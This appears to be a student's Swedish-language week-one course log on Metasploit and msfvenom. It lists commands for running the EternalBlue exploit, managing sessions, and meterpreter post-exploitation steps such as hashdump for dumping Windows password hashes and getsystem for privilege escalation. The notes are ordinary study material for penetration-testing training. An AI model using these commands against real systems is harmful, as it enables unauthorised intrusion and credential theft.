## Vecka 1
2025-11-03 - 2025-11-09

## Verktyg
- Metasploit
- Msfvenom

Intressanta kommandon:<br>
<code>search eternal blue<br> 
use xx<br>
set(g) RHOSTS [ip-adress]<br>
run (exploit)</code>
<br><br>
<code>sessions<br>
sessions -i x</code>
<br><br>
<code>ctrl-z</code> för att soppa aktuell session i bakgrunden
<br><br>
Kommandon inom meterpreter<br>
<code>hashdump</code>  Dumps the contents of the SAM database<br>
<code>getsystem</code> Attempts to elevate your privilege to that of local system<br>
<code>ps</code> Lists running processes<br>
<code>migrate x</code> Allows you to migrate Meterpreter to another process, x = PID<br>

<br>
Intressanta moduler i msfconsole:<br>
post/multi/recon/local_exploit_suggester<br>
exploit/windows/smb/ms17_010_eternalblue<br>
post/multi/manage/shell_to_meterpreter<br>
exploit/windows/http/icecast_header<br>